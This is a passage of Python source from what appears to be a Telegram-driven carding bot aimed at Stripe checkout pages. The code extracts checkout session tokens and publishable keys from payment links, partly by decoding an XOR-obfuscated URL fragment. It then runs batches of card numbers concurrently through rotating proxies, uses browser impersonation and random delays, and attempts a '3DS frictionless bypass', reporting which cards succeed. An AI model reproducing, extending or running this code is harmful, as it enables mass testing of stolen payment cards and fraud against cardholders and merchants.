                                    data = auth_resp.json()
                                    state = data.get("state")
                                except Exception:
                                    state = "3DS Attempt failed"
                                if state == "challenge_required":
                                    return {
                                        "status": False,
                                        "result": {
                                            "status": "declined",
                                            "message": state,
                                            "time": taken
                                        }
                                    }

                                    poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                    poll_headers = {
                                        "accept": "application/json",
                                        "origin": "https://js.stripe.com",
                                        "referer": "https://js.stripe.com/"
                                    }
                                    poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)

                            if state is None and 'data' in locals() and isinstance(data, dict) and 'error' in data:
                                err = data.get('error', {})
                                if "not supported" not in str(err.get('message', '')).lower():
                                    result['decline_code'] = err.get('decline_code') or err.get('code') or '3ds_auth_failed'
                                    result['error'] = f"Stripe rejected 3DS2 authenticate: {err.get('message', 'Unknown error')}"
                                    return result

                            if state != "challenge_required":
                                poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                poll_headers = {
                                    "accept": "application/json",
                                    "origin": "https://js.stripe.com",
                                    "referer": "https://js.stripe.com/"
                                }
                                poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)
                                poll_json = poll_resp.json()
                                status_2 = poll_json.get('status')
                                if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                    result['success'] = True
                                else:
                                    next_act_2 = poll_json.get('next_action') or {}
                                    if status_2 == 'requires_action' and next_act_2.get('type') == 'redirect_to_url':
                                        redirect_url = next_act_2.get('redirect_to_url', {}).get('url')
                                        return_url = next_act_2.get('redirect_to_url', {}).get('return_url')
                                        if redirect_url:
                                            await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                            
                                            poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
                                            poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                            poll_json_3 = poll_res_3.json()
                                            poll_status_3 = poll_json_3.get('status')
                                            
                                            if poll_status_3 in ['succeeded', 'requires_capture', 'complete']:
                                                result['success'] = True
                                                result['final_url'] = return_url or redirect_url
                                                return result
                                                
                                            result['decline_code'] = '3d_secure_required_hard'
                                            result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
                                            result['final_url'] = return_url or redirect_url
                                            return result

                                    err = poll_json.get('last_payment_error') or poll_json.get('error') or {}
                                    if isinstance(err, dict) and err.get('message'):
                                        result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                        result['error'] = err.get('message', 'Unknown error')
                                    else:
                                        result['decline_code'] = status_2
                                        next_act = poll_json.get('next_action') or {}
                                        result['error'] = f"Stuck in requires_action. next_action: {next_act}"
                                return result
                            elif next_action.get('type') == 'redirect_to_url':
                                redirect_url = next_action.get('redirect_to_url', {}).get('url')
                                return_url = next_action.get('redirect_to_url', {}).get('return_url')
                                
                                if redirect_url:
                                    await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                    
                                    poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
                                    poll_res = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                    poll_json = poll_res.json()
                                    poll_status = poll_json.get('status')
                                    
                                    if poll_status in ['succeeded', 'requires_capture', 'complete']:
                                        result['success'] = True
                                        result['final_url'] = return_url or redirect_url
                                        return result
                                        
                                    result['decline_code'] = '3d_secure_required_hard'
                                    result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
                                    result['final_url'] = return_url or redirect_url
                                    return result
                        except Exception as ex:
                            print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
                            result['decline_code'] = f'3d_secure_exception_{str(ex)[:30]}'
                            return result
                            
                        result['decline_code'] = f"3d_secure_fallback_type_{next_action.get('type', 'none')}"
                        return result
                    elif status == 'requires_payment_method':
                        result['decline_code'] = 'generic_decline'
                        result['error'] = 'Payment requires a new payment method (generic decline)'
                    elif status == 'open':
                        err = confirm_json.get('error')
                        if isinstance(err, dict):
                            result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'open')
                            result['error'] = err.get('message', 'Unknown error')
                            return result
                        
                        result['decline_code'] = 'open'
                        result['error'] = str(confirm_json)[:500]  # Dump the JSON to telegram so we can see what's actually there
                    else:
                        result['decline_code'] = status
                else:
                    err = confirm_json.get('error', {})
                    result['decline_code'] = err.get('decline_code') or err.get('code') or err.get('type', 'unknown')
                    result['error'] = err.get('message', 'Unknown error')
                    
                # If we reach here without exception, do not retry!
                return result
                    
            except Exception as e:
                if current_attempt < max_retries - 1:
                    await asyncio.sleep(2)
                    continue
                result['error'] = str(e)
                result['decline_code'] = 'exception'
                result['response_time'] = time.time() - start
                return result
                
        return result

class ConcurrentHitter:
    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        
    async def analyze_first(self):
        url_lower = self.url.lower()
        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower:
            if self.update_callback:
                await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
            return False
            
        # Try extracting CS and PK directly from URL first to bypass network request entirely
        cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
        pk_key = None
        hash_idx = self.url.find('#')
        if hash_idx != -1:
            import urllib.parse, base64, json
            hash_str = self.url[hash_idx+1:]
            decoded = urllib.parse.unquote(hash_str)
            try:
                raw_bytes = base64.b64decode(decoded + '==')
                json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                data = json.loads(json_str)
                pk_key = data.get('apiKey')
            except: pass

        if cs_token and pk_key:
            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
            if api_data.get('success'):
                self.url_info['amount'] = api_data.get('amount')
                self.url_info['raw_amount'] = api_data.get('raw_amount')
                self.url_info['merchant'] = api_data.get('merchant')
                self.url_info['locked_email'] = api_data.get('locked_email')
            return True

        for _ in range(3):
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}
                
                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
                
                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=5)
                    html = resp.text
                    
                    cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                    
                    pk_key = None
                    hash_idx = self.url.find('#')
                    if hash_idx != -1:
                        import urllib.parse, base64, json
                        hash_str = self.url[hash_idx+1:]
                        decoded = urllib.parse.unquote(hash_str)
                        try:
                            raw_bytes = base64.b64decode(decoded + '==')
                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                            data = json.loads(json_str)
                            pk_key = data.get('apiKey')
                        except: pass
                    if not pk_key:
                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                        
                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                    
                    if cs_token and pk_key:
                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
                        if api_data.get('success'):
                            self.url_info['amount'] = api_data.get('amount')
                            self.url_info['raw_amount'] = api_data.get('raw_amount')
                            self.url_info['merchant'] = api_data.get('merchant')
                            self.url_info['locked_email'] = api_data.get('locked_email')
                    return True
            except Exception as e:
                continue
                
        if self.update_callback:
            await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
        return False

    async def _worker(self, queue: asyncio.Queue):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            try:
                max_retries = 2
                for try_idx in range(max_retries):
                    proxy_data = await ProxyManager.get_random(self.user_id)
                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'), self.url_info.get('locked_email'))
                    
                    import random
                    await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
                    
                    result = await hitter.hit(card, attempt_num, self.user_id)
                    if isinstance(result, dict) and "status" in result and "result" in result:
                        friend_res = result
                        result = {
                            'attempt': attempt_num,
                            'card': card,
                            'success': friend_res.get("status", False),
                            'decline_code': friend_res.get("result", {}).get("status"),
                            'response_time': friend_res.get("result", {}).get("time", 0),
                            'amount': self.url_info.get('amount'),
                            'merchant': self.url_info.get('merchant'),
                            'proxy_raw': proxy_data['raw'] if proxy_data else None,
                            'error': friend_res.get("result", {}).get("message")
                        }
                    result['amount'] = self.url_info.get('amount')
                    result['merchant'] = self.url_info.get('merchant')
                    
                    err_str = result.get('error', '')
                    should_retry = False
                    if result.get('decline_code') == 'exception':
                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
                            should_retry = True
                            
                    if should_retry:
                        if try_idx < max_retries - 1:
                            delay = 2.0 * (try_idx + 1)
                            await asyncio.sleep(delay)
                            continue
                    break
                
                self.completed += 1
                if result['success']:
                    self.successes += 1
                else:
                    self.fails += 1
                    
                if self.update_callback:
                    await self.update_callback({
                        "status": "progress",
                        "result": result,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            except Exception as e:
                import traceback
                print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
                self.completed += 1
                self.fails += 1
                if self.update_callback:
                    err_res = {'success': False, 'card': card, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
                    await self.update_callback({
                        "status": "progress",
                        "result": err_res,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            finally:
                queue.task_done()
    
    async def run(self):
        if self.update_callback:
            await self.update_callback({"status": "analyzing", "step": "Extracting Stripe keys and payload..."})
            
        success = await self.analyze_first()
        if not success:
            return
            
        if self.update_callback:
            await self.update_callback({"status": "starting", "url_info": self.url_info})
            
        import asyncio
        queue = asyncio.Queue()
        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
            queue.put_nowait((card, idx+1))
            
        workers = []
        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
            task = asyncio.create_task(self._worker(queue))
            workers.append(task)
            
        await queue.join()
        
        for w in workers:
            w.cancel()
            
        if self.update_callback:
            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
